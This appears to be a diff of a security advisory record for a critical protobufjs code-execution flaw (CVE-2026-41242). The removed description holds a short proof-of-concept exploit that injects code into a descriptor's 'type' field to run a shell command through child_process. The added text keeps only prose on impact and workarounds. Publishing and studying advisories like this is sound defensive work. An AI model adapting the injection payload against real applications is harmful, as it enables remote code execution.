@@ -42,12 +42,12 @@
         "Value": "CVE-2026-41242"
       }
     ],
-    "Description": "### Summary\nprotobufjs compiles protobuf definitions into JS functions. Attackers can manipulate these definitions to execute arbitrary JS code.\n\n### Details\nAttackers can inject arbitrary code in the \"type\" fields of protobuf definitions, which will then execute during object decoding using that definition.\n\n### PoC\n```js\nconst protobuf = require('protobufjs');\nmaliciousDescriptor = JSON.parse(`{\"nested\":{\"User\":{\"fields\":{\"id\":{\"type\":\"int32\",\"id\":1},\"data\":{\"type\":\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\",\"id\":2}}},\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\":{\"fields\":{\"content\":{\"type\":\"string\",\"id\":1}}}}}`)\nconst root = protobuf.Root.fromJSON(maliciousDescriptor);\nconst UserType = root.lookupType(\"User\");\nconst userBytes = Buffer.from([0x08, 0x01, 0x12, 0x07, 0x0a, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);\ntry {\n    const user = UserType.decode(userBytes);\n} catch (e) {}\n```\n\n### Impact\nRemote code execution when attackers can control the protobuf definition files.",
+    "Description": "## Summary\n\nprotobufjs could execute generated JavaScript code derived from protobuf schema metadata. When loading a crafted JSON descriptor, schema-controlled type names and type references could reach runtime code generation without sufficient validation.\n\n## Impact\n\nAn attacker who can provide a malicious protobuf definition or JSON descriptor to an application may be able to execute arbitrary JavaScript in the context of the process using protobufjs.\n\nThis requires control over the protobuf schema or descriptor being loaded. Applications that only decode messages using trusted, application-defined schemas are not directly affected by this issue.\n\n## Preconditions\n\n- The application must allow an attacker to control or influence a protobuf definition or JSON descriptor.\n- The application must load that definition through protobufjs reflection APIs such as descriptor loading.\n- The affected generated-code path must be reached, for example by performing an operation on the loaded type.\n\n## Workarounds\n\nDo not load protobuf definitions or JSON descriptors from untrusted sources with affected versions. If untrusted schemas must be accepted, validate or restrict them before loading and run schema processing in an isolated environment.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2026-04-16T22:34:57Z",
     "Severity": "CRITICAL",
     "Summary": "Arbitrary code execution in protobufjs",
-    "UpdatedAt": "2026-04-24T20:54:50Z",
+    "UpdatedAt": "2026-05-04T22:12:42Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 9.8,
